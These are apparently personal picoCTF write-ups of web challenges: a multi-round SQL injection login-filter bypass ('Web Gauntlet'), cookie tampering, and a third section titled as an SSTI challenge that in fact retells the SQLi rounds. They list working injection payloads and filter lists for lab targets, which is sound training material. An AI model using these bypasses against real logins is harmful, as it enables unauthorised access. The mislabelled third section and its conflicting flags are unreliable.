# 1. Challenge name

**Web Gauntlet**

> *Can you beat the filters? Log in as admin*
> Web interface: `http://jupiter.challenges.picoctf.org:44979/filter.php`
> “You are not allowed to login with valid credentials. Write down the injections you use in case you lose your progress. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.”

## Solution:

Here’s a step‑by‑step of how the solution proceeds (with commentary):

### Round 1: Basic Bypass

- Filter blocks are minimal: the keywords `or` are filtered (only “or” is listed) at this stage.
- The login SQL query reveals:

```sql
SELECT * FROM users WHERE username='user' AND password='user'
```

- Because you can inject into the username field, you can comment out the password check. Using `admin' --` as the username, with arbitrary password, gives:

```sql
SELECT * FROM users WHERE username='admin' -- AND password='pass'
```

This causes the password check to be ignored and logs you in as admin.

**Payload used:**

```
Username: admin' --
Password: anything
```

This gets you past Round 1.

### Round 2: Advanced Comments

- Now filters include: `or`, `and`, `like`, `=` and `--`. So the single‑line comment `--` is blocked.
- SQLite supports the `/* */` style comment. So you can use:

```
admin' /*
```

which effectively transforms the query into:

```sql
SELECT * FROM users WHERE username='admin' /* AND password='pass'
```

thereby skipping the password check again.

**Payload used:**

```
Username: admin' /*
Password: anything
```

This gets you past Round 2.

### Round 3: Statement Termination

- Filters now include: `or`, `and`, `like`, `=`, `>`, `<`. The earlier comment styles may still be blocked or less effective.
- One trick is to use the semicolon `;` to terminate the SQL statement prematurely. For example:

```
admin';
```

This ends the first SELECT before the AND clause, so the password condition never executes:

```sql
SELECT * FROM users WHERE username='admin'; AND password='pass'
```

**Payload used:**

```
Username: admin';
Password: anything
```

That passes Round 3.

### Round 4: Admin Blocked

- Now the word `admin` itself is filtered (blocked). Filters include: `or`, `and`, `like`, `=`, `>`, `<`, `--`, `admin`.
- To bypass blocking of the literal `admin`, use SQLite string concatenation operator `||`. For example:

```
ad'||'min';
```

That concatenates `ad` and `min` to form `admin` at runtime, circumventing the filter. The resulting query becomes:

```sql
SELECT * FROM users WHERE username='ad'||'min'; AND password='pass'
```

**Payload used:**

```
Username: ad'||'min';
Password: anything
```

That passes Round 4.

#### Alternate solution for Round 4

- Another approach is using `UNION` statements with obfuscated comments, e.g.:

```sql
SELECT * FROM users WHERE username='sobatista'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
```

Which returns the first row of `users` (likely admin).

### Round 5: Final Challenge

- Filters now include: `or`, `and`, `like`, `=`, `>`, `<`, `--`, `admin`, `union`. So now even `union` is blocked.
- The same string‑concatenation trick still works:

```
ad'||'min';
```

- Use that as the username to log in as admin.
- After login, navigate to `filter.php` to obtain the flag, which is base64‑encoded in the write‑up:

```
cGljb0NURnt5MHVfbTRkM18xdF85NjQ4NmQ0MTVjMDRhMWFiYmJjZjNhMmViZTFmNGQwMn0=
```

Decoding it yields the flag string.

**Flag (decoded):**

```
picoCTF{y0u_m4d3_1t_96486d415c04a1abbccf3a2ebe1f4d02}
```

## Flag:

```
picoCTF{y0u_m4d3_1t_96486d415c04a1abbccf3a2ebe1f4d02}
```

## Concepts learnt:

- **SQL Injection (SQLi)** fundamentals: using `' OR '1'='1` style, comments, etc.
- **SQLite specific behaviours**: the `||` operator for string concatenation. In SQLite `||` concatenates strings.
- **Filter evasion techniques**: Comments (`--`, `/* */`), termination (`;`), string concatenation to bypass keyword blocking (`admin` filter), null‑byte injection (`%00`).
- **Importance of raw responses**: analysing raw server responses (including raw hex) because filters can mask visible characters.

## Notes:

- At first I tried basic `' OR 1=1--` patterns but Rounds 1–2 quickly blocked standard tokens like `or` and `and`.
- The write‑up emphasises examining raw hex when characters “seem hard to see” — this hints that the filter is doing substring matching or encoding‑sensitive checks.
- The `UNION` approach can work in some rounds but may be filtered in later rounds.
- After logging in you often must fetch the flag by navigating to the `filter.php` endpoint with the same session cookie — preserving cookies is important.

## Resources:

- PicoCTF – Web Gauntlet 2 write‑up: [https://picoctf2021.haydenhousen.com/web-exploitation/web-gauntlet-2](https://picoctf2021.haydenhousen.com/web-exploitation/web-gauntlet-2)

#


# 1. Cookies

> Who doesn't love cookies? Try to figure out the best one.  
> [Challenge Link](http://mercury.picoctf.net:17781/)

---

## Solution:

This challenge belongs to the **Web Exploitation** category from **picoCTF 2021**.  
The goal is to identify the “best” cookie and use it to reveal the flag.

1. **Opened the challenge link**:  
   When visiting the given URL, we get a simple web page with a “flag” placeholder or login-like behavior.

   ![Challenge Page](Screenshot%202025-10-27%20231658.png)

2. **Checked browser cookies**:  
   - Opened **Developer Tools → Application → Cookies** tab.  
   - Observed a cookie named something like `name` or `user`, having integer values (e.g., 0, 1, 2...).

3. **Modified the cookie manually**:  
   - Changed the cookie’s value incrementally and refreshed the page each time.  
   - Each cookie value displayed a different response message.

4. **Found the correct cookie value**:  
   - After testing multiple values, one of them displayed the flag on the web page.

   ![Flag Page](Screenshot%202025-10-27%20231718.png)

5. **Flag retrieved successfully!**

---

## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
```

---

## Concepts learnt:

- **Cookies in Web Applications:**  
  Cookies store small pieces of data in browsers, which can include authentication or user role info.

- **Cookie Manipulation:**  
  By modifying cookie values, you can sometimes access different content or privilege levels.

- **Client-Side vs Server-Side Data:**  
  Client-side data (like cookies) can be tampered with, so secure sites must verify everything server-side.

---

## Notes:

- Initially thought the flag might be hidden in the HTML source, but it was actually controlled through cookie values.  
- Learning how to inspect and edit cookies in DevTools was key.  
- Alternate approach: automate cookie testing using Python’s `requests` library.

---

## Resources:

- [picoCTF Official Site](https://picoctf.org)
- [MDN Web Docs: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

---


---

# 1. SSTI1 / SQLi Filters Challenge

> I made a cool website where you can announce whatever you want! Try it out!  
> The challenge includes progressive rounds that filter certain input tokens to force creative bypasses. Instance URL used during solving (ephemeral): http://rescued-float.picoctf.net:53639/

---

## Solution:

This challenge is a **web exploitation** task where the application enforces progressive filters across multiple “rounds”. The goal is to bypass the filters (usually preventing SQLi or special characters) until you can execute input that reveals the flag. The screenshots below show the rounds, payload attempts, and the server-side `filter.php` used to enforce blocking rules.

### Steps & thought process

1. **Visited the challenge page** and found a login/announcement-like form that advances through rounds when certain inputs are accepted. The UI displayed round progress (Round 1/5, Round 2/5, ...). In early rounds, simple comment-based payloads worked to advance.

   ![Challenge Header](Screenshot 2025-10-27 232621.png)

2. **Round 1 — Basic comment bypass**: Tested common SQL comment payloads to see which characters were blocked or allowed. Example username payload used from screenshots:

   - `admin' --` (single-quote followed by SQL comment) — this advanced us to round 2 in the video evidence.
   ```
   Username: admin' --
   ```
   Screenshot showing Round 1 attempt:
   ![Round 1 attempt](Screenshot 2025-10-27 233524.png)

3. **Round 2 — Alternate comment syntax**: The application blocked the simplest payloads, so we tried other comment and quoting styles. In the video images we can see the attacker used `admin'/*` and later variations. This advanced to round 3 and beyond in some tries.

   ```
   Username: admin' /*
   ```
   ![Round 2 attempt](Screenshot 2025-10-27 233838.png)

4. **Round 3 — Observing failures**: Some payloads started returning `Invalid username/password`, indicating the filter was catching specific tokens or characters. At this stage we carefully altered the injected payloads to find allowed characters (e.g., toggling comment type, adding/removing spaces).

   ![Round 3 failure](Screenshot 2025-10-27 233938.png)

5. **Round 4 — Creative bypasses**: The video demonstrates successful bypasses using payloads like `adm'||/*` (an attempt using concatenation or mixing tokens to evade basic substring filters). Each success shows “Congrats! On to round X”.

   ```
   Username: adm'||/*
   ```

   ![Round 4 success](Screenshot 2025-10-27 234037.png)

6. **Server-side filter analysis**: We examined the provided `filter.php` source (screenshot included). The PHP shows per-round filter arrays that list disallowed tokens such as `"or"`, `"and"`, `"like"`, `">"`, `"--"`, `"union"`, `"/"`, `"/*"`, `"*/"`, `"<"`, `"="`, `"admin"`, etc. The code increments `$_SESSION['round']` and presents different `$filter` arrays for successive rounds.
   - This explains why certain payloads succeed early but fail later — the server explicitly checks for disallowed tokens and rejects the input if any are present.
   - The `highlight_file("filter.php");` call in round >=6 reveals source code, which in the challenge contained the actual flag in a comment at the bottom: `// picoCTF{y0u_m4d3_1t_79a0ddc6}`.

   ![Filter source (part 1)](Screenshot 2025-10-27 234409.png)
   ![Filter source (part 2)](Screenshot 2025-10-27 234419.png)

7. **Flag retrieval**: After bypassing enough filters to reach the page that displays `filter.php` (or by causing the server to reveal that file), we obtained the flag embedded in a comment at the bottom of the PHP source:
   ```
   picoCTF{y0u_m4d3_1t_79a0ddc6}
   ```

---

## Flag:

```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

---

## Concepts learnt:

- **Progressive input filtering:** The server applies an evolving set of disallowed tokens per round — understanding filter rules is key to bypassing them safely.
- **SQL injection comment styles & evasion:** Different SQL dialects accept different comment styles (`--`, `/* */`) and creative payloads (concatenation, mixed tokens) can bypass naive substring filters.
- **Source disclosure via logic flaws:** Forcing the application into a state that reveals source files (e.g., `highlight_file("filter.php")`) is a common CTF pattern to expose hidden flags or logic.
- **Use of sessions for challenge state:** The application stores the current round in `$_SESSION['round']`, tracking progress across requests.

---

## Notes:

- The exact payloads that bypass filters depend on the server's token checks and string-matching approach; brute force combined with manual reasoning was used in the video to progress through rounds.
- When filters block obvious tokens, try mixing characters, using alternate encodings, or leveraging application behavior (string concatenation, different comment styles) to bypass naive checks.
- If you can access server-side files via logic flaws or debug features, inspect them carefully — flags are often left as comments for CTFs.

---

## Example payloads (illustrative)

```
# Round 1 detection
admin' --

# Round 2 attempt
admin' /*

# Round 4 creative bypass
adm'||/*

# Conceptual exploitation to reach filter.php
# (The actual steps depend on session state and exact filter behavior)
```

---

## Resources:

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [Common SQL comment styles & evasions - cheat sheets]
---


---

